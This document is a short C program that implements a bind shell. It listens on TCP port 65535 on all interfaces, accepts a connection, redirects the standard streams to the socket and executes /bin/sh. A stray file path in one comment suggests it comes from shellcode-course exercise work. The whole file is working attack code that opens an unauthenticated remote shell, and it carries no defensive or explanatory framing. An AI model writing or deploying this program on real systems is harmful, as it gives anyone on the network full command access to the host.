#include <stdio.h>
#include <stdlib.h>
#include <netdb.h>
#include <netinet/in.h>
#include <string.h>

int main( int argc, char *argv[] ) {
   int serverSocketFileDescriptor;
   int clientSocketFileDescriptor; 
   int clilen;
   struct sockaddr_in serv_addr;
   struct sockaddr_in cli_addr;
   
   
   /* First call to socket() function */
   serverSocketFileDescriptor = socket(AF_INET, SOCK_STREAM, 0);
   
   /* Initialize socket structure */
   bzero((char *) &serv_addr, sizeof(serv_addr));
   
   serv_addr.sin_family = AF_INET;
   serv_addr.sin_addr.s_addr = INADDR_ANY;
   serv_addr.sin_port = htons(65535);
   
   /* Now bind the host address using bind() call.*/
   bind(serverSocketFileDescriptor, (struct sockaddr *) &serv_addr, sizeof(serv_addr));
      
   /* 
	 Now start listening for the clients, here p/home/ady/DexterLab/slae/SLAE/template.nasmrocess will
   * go in sleep mode and will wait for the incoming connection
   */
   listen(serverSocketFileDescriptor,1);
   clilen = sizeof(cli_addr);
   
   /* Accept actual connection from the client */
   clientSocketFileDescriptor = accept(serverSocketFileDescriptor, (struct sockaddr *)&cli_addr, &clilen);

   /*Redirect to the new socket the sdtin,stdout,stderr*/
   dup2(clientSocketFileDescriptor, 0);
   dup2(clientSocketFileDescriptor, 1);
   dup2(clientSocketFileDescriptor, 2);

   /*execute /bin/sh */ 
   execve("/bin/sh", NULL, NULL);

   /* Close the sockets*/
   close(clientSocketFileDescriptor);
   close(serverSocketFileDescriptor);
}
